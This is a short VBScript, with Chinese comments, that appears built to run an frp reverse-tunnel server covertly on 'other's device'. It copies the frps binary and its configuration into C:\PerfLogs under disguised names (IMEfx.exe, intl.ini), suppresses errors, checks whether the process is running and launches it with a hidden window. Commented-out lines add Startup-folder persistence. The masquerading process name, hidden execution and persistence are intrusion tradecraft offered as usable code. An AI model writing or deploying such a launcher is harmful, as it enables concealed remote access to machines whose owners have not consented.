' support windows ; for other's device 
On Error Resume Next

Dim dir_bak,dir_run,frp,frpini,frp_run,frpini_run,startup_dir
dir_bak = "C:\Program Files\Windows NT\"
dir_run = "C:\PerfLogs\"
frp = "frps_windows_amd64.exe"
frpini = "frps.ini"
frp_run = "IMEfx.exe"
frpini_run = "intl.ini"

Dim fsObj
Set fsObj = CreateObject("Scripting.FileSystemObject")
Function CopyFileFun(runfile,soufile,desfile)
  If Not fsObj.FileExists(runfile) Then fsObj.CopyFile (soufile), (desfile) End If
End Function

CopyFileFun (dir_run & frp_run),(dir_bak & frp),(dir_run & frp_run)
CopyFileFun (dir_run & frpini_run),(dir_bak & frpini),(dir_run & frpini_run)
'startup_dir = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\" ---系统启动目录无权限操作，手动复制操作
'CopyFileFun (startup_dir & "sys_startup.vbs"),(dir_bak & "frp_windows.vbs"),(startup_dir & "sys_startup.vbs") 
Set fsObj = Nothing

  ' ------ 判断系统进程是否存在 -------------------------------
Dim proc,procfrp,frpProcess
Set proc = GetObject("winmgmts:\\.\root\cimv2")
' ------ 注意此处查询进程是否存在时需要手动输入进程名，使用变量运行失败-----待解决
Set procfrp = proc.ExecQuery("select * from win32_process where name = 'IMEfx.exe'")
For Each pf In procfrp
  frpProcess = True 
Next

set objShell = WScript.CreateObject("WScript.Shell")
If Not frpProcess Then objShell.Run (dir_run & frp_run & " -c " & dir_run & frpini_run), 0 End If
Set objShell = Nothing
WScript.Quit
